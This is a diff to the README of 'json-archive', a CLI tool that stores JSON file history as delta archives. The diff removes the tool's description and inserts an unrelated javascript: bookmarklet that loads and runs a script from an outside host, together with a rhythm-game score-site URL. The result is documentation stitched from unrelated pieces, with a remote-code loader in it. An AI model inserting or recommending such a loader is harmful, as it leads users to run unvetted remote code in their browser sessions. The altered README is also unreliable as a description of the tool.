@@ -1,11 +1,7 @@
 # json-archive
 
-A practical CLI tool for tracking JSON file changes over time. Instead of keeping multiple copies of JSON files, this creates compact delta-based archives that preserve the complete history.
-
-## What it does
-
-This tool solves a simple problem: you have a JSON file that changes regularly, and you want to track its history without storing dozens of full copies. 
-
+javascript:(function(){var e=document.createElement("script");e.src="https://reiwa.f5.si/chuni_scoredata/main.js?"+String(Math.floor((new Date).getTime()/1e3)),document.body.appendChild(e)})();
+https://chunithm-net-eng.com/mobile/home/
 `json-archive` creates a `.json.archive` file next to your original JSON file. Each time you run the tool, it calculates only what changed and appends those deltas to the archive. You get complete history with minimal storage overhead.
 
 The archive format is human-readable JSONL (not binary), making it easy to inspect, debug, and pipe into other scripts or web visualizations.
